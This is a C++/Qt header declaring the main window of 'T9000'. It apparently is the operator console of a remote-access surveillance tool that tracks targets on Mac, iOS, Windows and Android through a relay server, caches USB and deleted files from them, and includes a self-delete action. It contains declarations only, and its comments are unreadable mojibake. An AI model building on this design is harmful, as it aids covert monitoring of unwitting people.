/*!
	Description : T9000 ������
	Author		: Ruining Song
	Date		: 2013.11.6
	Remark		:
*/


#ifndef MAINDLG_H
#define MAINDLG_H

#include <QtGui>
#include <QSystemTrayIcon>
#include <string>
#include "ControlConnection.h"
#include "processdatathread.h"
#include "ui_maindlg.h"
#include "conndlg.h"
#include "IpFinder.h"

//
// ���ƶ˵���Ϣ
//
#define WM_CONTROL_CONNCOMPLETED        (WM_APP + 100)      // �������ӽ���
#define WM_CONTROL_CONNFAILED           (WM_APP + 101)      // ��������ʧ��
#define WM_CONTROL_CONNCLOSED           (WM_APP + 102)      // �������ӹر�
#define WM_CONTROL_ONLINE               (WM_APP + 103)      // ���ƶ�����
#define WM_CONTROL_PASSFAILED           (WM_APP + 104)      // �������
#define WM_CONTROL_INOTHERPLACE         (WM_APP + 105)      // ��һ����ͬ���û��������ط���¼��
#define WM_CONTROL_SOLECONNMULTIDAEMON  (WM_APP + 106)      // ���û����ƶ����ӵ����û���ת��������
#define WM_CONTROL_MULTICONNSOLEDAEMON  (WM_APP + 107)      // ���û����ƶ����ӵ����û���ת��������
#define WM_CONTROL_MULTIUNSIGNED        (WM_APP + 108)      // ���û����ƶ�û�о����϶�
#define WM_CONTROL_DATAPORTINCORRECT    (WM_APP + 109)      // ���ƶ˺���ת�����������ݶ˿ڲ�һ��

//
// Ŀ����Ϣ
//
#define WM_NEW_TARGET                   (WM_APP + 110)      // ��Ŀ��
#define WM_ERASE_TARGET                 (WM_APP + 111)      // Ŀ�����
#define WM_TARGET_FOUND                 (WM_APP + 112)      // ����Ŀ��
#define WM_TARGET_STATUS_CHANGE         (WM_APP + 113)      // Ŀ��״̬�ı�
#define WM_TARGET_INFO_UPDATED          (WM_APP + 114)      // Ŀ����Ϣ����
#define WM_TARGET_EXINFO_UPDATED        (WM_APP + 115)      // Ŀ����չ��Ϣ����
#define WM_TARGET_SWITCH                (WM_APP + 116)      // Ŀ���л�
#define WM_TARGET_DATACONNCLOSED        (WM_APP + 117)      // Ŀ���������ӹر�

//
// ������Ϣ
//
#define WM_SET_STATUSINFO_A             (WM_APP + 200)
#define WM_SET_STATUSINFO_W             (WM_APP + 201)

#define WM_ADD_TARGET_DIALOG			(WM_APP + 202)		// ��� Target Dialog


#define WM_QUERY_DAEMONADDR_FINISHED    (WM_APP + 800)
#define WM_QUERY_DAEMONADDR2_FINISHED   (WM_APP + 801)

typedef int (WINAPI *ZlibUncompress)(BYTE *dest, ULONG *destLen, const BYTE *source, ULONG sourceLen);

class DlgContainer;
class QTimer;
class WaitDlg;
class QueryDaemonAddressDlg;

namespace Category
{
	enum CategoryType{GROUP, PLATFORM, IP};
}

namespace DisplayMode
{
	enum DisplayModeType{SHOW_ALL, SHOW_ONLINE, SHOW_OFFLINE, SHOW_FAVORITE};
}

class MainDlg : public QMainWindow
{
	Q_OBJECT

public:
	MainDlg(QWidget *parent = 0, Qt::WFlags flags = 0);
	~MainDlg();

	//
	// process data thread ���
	//
	PDATA_BLOCK PopPlgDataBlock();

	void PushPlgDataBlock(PDATA_BLOCK dataBlock);

protected:

	// �رմ����¼�
	void closeEvent(QCloseEvent *event);

	// windows ��Ϣ�ӹ�
	bool winEvent(MSG *message, long *result);

public slots:

	//
	// �ֱ��Ӧ�������Ͳ˵��ϵ�һϵ������
	//

	// ��ʼ
	void StartAction();

	// ֹͣ
	void StopAction();

	// Ǩ����ת
	void MigrateDaemonAction();

	// �˳�
	void ExitAction();

	// ȫ�ֲ���
	void ConfigAction();

	// ���ò������
	void PolicyAction();

	// ����Ŀ�����
	void AliasAction();

	// �ղ�
	void FavoriteAction();

	// ��ɾ��
	void DelSelfAction();

	// ��������
	void FlowControlAction();

	// ���Ŀ������
	void CleanAction();

	// ����Ŀ���
	void CreateTargetAction();
	
	// ������ת
	void CreateDaemonAction();

	// ������ݿ�
	void CleanDatabaseAction();

	// ��ѯ��ת������Ϣ
	void QueryDaemonAddressAction();

	// ʹ��ָ��
	void HelpAction();

	// ����
	void AboutAction();

	//////////////////////////////////

	// ˫���б��е�Ŀ��
	void ShowTarget(QTreeWidgetItem* item, int column);

	// �����б��е�Ŀ��
	void CurrentTargetChanged(QTreeWidgetItem* item, int column);

	// �б��Ҽ��˵�
	void onTrTargetContextMenuActived(QPoint point);

	// ���鷽ʽ�ı�
	void onCmbCateGoryCurrentIndexChanged(int index);

	// ��ʾ��ʽ�ı�
	void onCmbDisplayModeCurrentIndexChanged(int index);

	//////////////////////////////////

	// ������Ӧ����
	void PNGTimerTimer();

	// ��������˸
	void FlashTrayIcon();

	// ��������Ӧ
	void ProcessTrayEvent(QSystemTrayIcon::ActivationReason reason);

public slots:
	
	void ActiveMainWindow();

	void ModifyPluginPolicy(unsigned int pTarget, int pluginNumber);

private:

	//
	// �ֱ��Ӧ���յ���ÿһ��������Ϣ
	//

	// �����־��Ϣ
	void on_WM_SET_STATUSINFO_A(MSG* msg);

	// �����־��Ϣ
	void on_WM_SET_STATUSINFO_W(MSG* msg);

	// �������
	void on_WM_CONTROL_CONNCOMPLETED(MSG* msg);

	// ����ʧ��
	void on_WM_CONTROL_CONNFAILED(MSG* msg);

	// ���ӹر�
	void on_WM_CONTROL_CONNCLOSED(MSG* msg);

	// ����
	void on_WM_CONTROL_ONLINE(MSG* msg);

	// �������
	void on_WM_CONTROL_PASSFAILED(MSG* msg);

	// �����û���¼
	void on_WM_CONTROL_INOTHERPLACE(MSG* msg);  

	//void on_WM_CONTROL_SOLECONNMULTIDAEMON(MSG* msg);  
	//void on_WM_CONTROL_MULTICONNSOLEDAEMON(MSG* msg);  
	//void on_WM_CONTROL_MULTIUNSIGNED(MSG* msg);        
	//void on_WM_CONTROL_DATAPORTINCORRECT(MSG* msg);

	// ��Ŀ��
	void on_WM_NEW_TARGET(MSG* msg);

	// Ŀ�����
	void on_WM_ERASE_TARGET(MSG* msg);

	// ����Ŀ��
	void on_WM_TARGET_FOUND(MSG* msg);

	// Ŀ��״̬�ı�
	void on_WM_TARGET_STATUS_CHANGE(MSG* msg);

	// Ŀ����Ϣ����
	void on_WM_TARGET_INFO_UPDATED(MSG* msg);

	// Ŀ����չ��Ϣ����
	void on_WM_TARGET_EXINFO_UPDATED(MSG* msg);

	// Ŀ���л�
	void on_WM_TARGET_SWITCH(MSG* msg);

	// Ŀ���������ӹر�
	void on_WM_TARGET_DATACONNCLOSED(MSG* msg);

	// ��� target dialog
	void on_WM_ADD_TARGET_DIALOG(MSG* msg);

private:

	////////////////////////////////////

	// �������΢��
	void InitWidgetAppearance();

	// ���� signal & slot
	void InitConnection();

	// �ı�����״̬
	void ChangeTargetStatus(QTreeWidgetItem* item, Target* target, bool online);

	// �����־���ļ�
	void WriteLogToFile(LPCWSTR wzLogInfo);

	// ��ʼ�����ݿ�
	void InitDatabase();

	////////////////////////////////////

	// �� update.dat �ж�ȡ�����Ϣ
	bool ReadPluginInfo(PPLUGIN_CXT PlgCxtVect[]);

	// �������ļ�
	bool ReadIniFile();

	// д�����ļ�
	void WriteIniFile();

	// ��������ת
	void ConnectToDaemon();

	// �����ݿ��м���Ŀ���б�
	void InitialTargetData();

	// ����
	void ControlOffline();

	// ���Ŀ��ڵ�
	void AddTargetNode(Target* tar);

	// ����־�����������Ϣ
	void AddStatusInfo(STATUS_LEVEL sl, const wchar_t* lpwzInfo);

	void AddStatusInfo(STATUS_LEVEL sl, const char* lpszInfo);

	// ���ݷ���������ӽڵ�
	void AddTargetNode(QTreeWidgetItem* item);

	// ��������
	void AddItemByGroup(QTreeWidgetItem* item);

	// ��ƽ̨���
	void AddItemByPlatform(QTreeWidgetItem* item);

	// �� IP ���
	void AddItemByIP(QTreeWidgetItem* item);

	// ͳ��Ŀ������
	void UpateTargetCount();

	// item �ڵ�ǰ��ʾģʽ���Ƿ������ʾ
	bool ItemCanShow(QTreeWidgetItem* item);

	// ˢ��Ŀ���б�
	void RefreshTargetList();

	// ��ȡĿ��Ŀ¼��Ϣ
	void AutoGetDirInfo(Target* tarBlock);

	// ���½ڵ����ʾ״̬
	void UpdateTargetDisplay(QTreeWidgetItem* item);

	//////////////////////////////////

private:
	Ui::MainDlgClass ui;
	QList<QWidget*> m_targetWindowList;		// ���ڴ洢�Ӵ���
	ConnDlg	m_connDlg;						// �Ի��� - ��������
	QTimer	m_PNGTimer;						// ���ڱ�����Ӧ
	QThread* dbThread;						// ���ݿ⴦���߳�

public:

	// ���ھ��
	HWND Handle;

	ControlConnection  *ctrConn;
	bool                ctrOnlineFlag;

	// ����ƶ�ʹ��
	//
	DWORD               dwCtrUserId;        // ���ƶ�ID
	DWORD               dwStartFlagId;
	DWORD               dwStopFlagId;

	// ����������Ϣ
	//
	std::string          aniDaemonIpAddr;
	int                 nPortForTarget;
	int                 nCtrPortForControl;
	int                 nDataPortForControl;

	BYTE                byPassMd5[16];
	bool                bAutoLogin;
	std::string          aniDbFile;
	std::string          aniLocalTarFileDir;

	// ��Ӧ�ò����������
	//
	BOOL                bUsbSecurityMode;
	BOOL                bCacheUsbDir;
	BOOL                bCacheUsbFile;
	DWORD               dwUsbMaxFileSize;    
	std::wstring          widUsbExt;
	BOOL                bCacheFileDel;
	DWORD               dwDelMaxFileSize;
	std::wstring          widFileDelExt;

	// Plugin Info
	//
	PPLUGIN_CXT         MacPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         IosPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         WindowsPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         AndroidPlgCxtVect[MAX_PLG_COUNT];
	ULONG               plgCount;

	// ����������
	//
	bool                bClosing;

	ProcessDataThread   *procDataThread;            // @@@ ��ǰ����ʹ�õ��߳̽��д���
	HANDLE              hEventForPlgData;
	PDATA_BLOCK         dataBlockHeader;
	ULONG               dataBlockCount;
	CRITICAL_SECTION    csPlgDataBlock;

	DlgContainer* m_targetDlgContainer;

	IpFinder m_ipfinder;

	std::list<QTreeWidgetItem*> m_itemList;

	// ��������
	int m_category;

	// ��ʾ����
	int m_displayMode;

	QSystemTrayIcon* m_tray;

	QTimer* m_trayFlashTimer;
	bool m_iconToggle;

	WaitDlg* m_waitDlg;

	QueryDaemonAddressDlg* m_qdaDlg;
};

extern MainDlg* FrmMain;

#endif // MAINDLG_H